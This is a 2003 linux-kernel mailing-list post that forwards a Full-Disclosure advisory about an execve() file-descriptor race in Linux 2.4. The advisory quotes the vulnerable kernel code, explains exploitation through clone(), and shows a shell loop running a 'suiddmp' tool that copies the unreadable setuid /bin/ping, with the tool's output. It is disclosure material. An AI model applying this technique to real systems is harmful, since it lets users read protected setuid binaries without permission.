Return-Path: <linux-kernel-owner+willy=40w.ods.org@vger.kernel.org>
Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
	id S270123AbTGNNht (ORCPT <rfc822;willy@w.ods.org>);
	Mon, 14 Jul 2003 09:37:49 -0400
Received: (majordomo@vger.kernel.org) by vger.kernel.org id S270133AbTGNNfa
	(ORCPT <rfc822;linux-kernel-outgoing>);
	Mon, 14 Jul 2003 09:35:30 -0400
Received: from pop.gmx.net ([213.165.64.20]:34222 "HELO mail.gmx.net")
	by vger.kernel.org with SMTP id S270150AbTGNNd5 convert rfc822-to-8bit
	(ORCPT <rfc822;linux-kernel@vger.kernel.org>);
	Mon, 14 Jul 2003 09:33:57 -0400
Content-Type: text/plain; charset=US-ASCII
From: "David R. Piegdon" <fleshyCPU@gmx.net>
To: linux-kernel@vger.kernel.org
Subject: Re: Linux v2.6.0-test1  [[Fwd: [Full-Disclosure] Linux 2.4.x execve() file read race vulnerability]]
Date: Mon, 14 Jul 2003 15:48:44 +0200
X-Mailer: KMail [version 1.4]
References: <200307141150.h6EBoe1P000738@81-2-122-30.bradfords.org.uk> <1058186383.606.52.camel@dhcp22.swansea.linux.org.uk> <20030714124721.GI15452@holomorphy.com>
In-Reply-To: <20030714124721.GI15452@holomorphy.com>
MIME-Version: 1.0
Content-Transfer-Encoding: 7BIT
Message-Id: <200307141548.44359.fleshyCPU@gmx.net>
Sender: linux-kernel-owner@vger.kernel.org
X-Mailing-List: linux-kernel@vger.kernel.org


this one was posted on full-disclosure a while ago
i think this is what alan cox means with
 fs/exec stuff
:)


----------  Forwarded Message  ----------
From: Paul Starzetz <paul@starzetz.de>
To: bugtraq@securityfocus.com,
 vendor-sec <vendor-sec@lst.de>,
 full-disclosure@lists.netsys.com
Date: Thu, 26 Jun 2003 19:24:23 +0200

Hi people,

again it is time to discover a funny bug inside the Linux execve()
system call.


Details:
- ---------

While looking at the execve() code I've found the following piece of
code (from fs/binfmt_elf.c):

static int load_elf_binary(struct linux_binprm * bprm, struct pt_regs *
regs)
{
    struct file *interpreter = NULL; /* to shut gcc up */

[...]

    retval = kernel_read(bprm->file, elf_ex.e_phoff, (char *)
elf_phdata, size);
    if (retval < 0)
        goto out_free_ph;

    retval = get_unused_fd();
    if (retval < 0)
        goto out_free_ph;
    get_file(bprm->file);
    fd_install(elf_exec_fileno = retval, bprm->file);


So, during the execution of new binary, the opened file descriptor to
the executable is put into the file table of the current (the caller of
execve()) process. This can be exploited creating a file sharing
parent/child pair by means of the clone() syscall and reading the file
descriptor from one of them.

Further, the check for shared files structure (in compute_creds() from
exec.c) is made to late, so even the parent can successfully exit after
playing games on that file descriptor and the child (if setuid) is
executed under full privileges. I wrote a simple setuid binary dump
utility so far, but further implications (due to the complexity of the
execve() syscall) may be possible...


Lets illustrate the vulnerability:

paul@buggy:~> ls -l /bin/ping
- -rws--x--x    1 root     root        29680 Oct 25  2001 /bin/ping

so the setuid ping binary can be only executed by anyone, but not read.

Now we start the suid dumper (while playing with the disk on another
console like cat /usr/bin/* >/dev/null) :

paul@buggy:~> while true ; do ./suiddmp /bin/ping -c 1 127.0.0.1 ; if
test $? -eq 1 ; then exit 1 ; fi; done 2>/dev/null | grep -A5 suc

and after few seconds:

Parent success stating:
uid 0 gid 0 mode 104711 inode 9788 size 29680
PING 127.0.0.1 (127.0.0.1) from 127.0.0.1 : 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=94 usec

- --- 127.0.0.1 ping statistics ---

paul@buggy:~> ls -l
total 7132
- -rwxr-xr-x    1 paul     users       29680 Jun 26 19:17 suid.dump
[...]

paul@buggy:~> ./suid.dump
Usage: ping [-LRUbdfnqrvVaA] [-c count] [-i interval] [-w deadline]
            [-p pattern] [-s packetsize] [-t ttl] [-I interface or address]
            [-M mtu discovery hint] [-S sndbuf]
            [ -T timestamp option ] [ -Q tos ] [hop1 ...] destination


Obviously the setuid binary has been duplicated :-) (but with no setuid
flag of course).


Source also available at:

http://www.starzetz.com/paul/suiddmp.c

/ih

-------------------------------------------------------

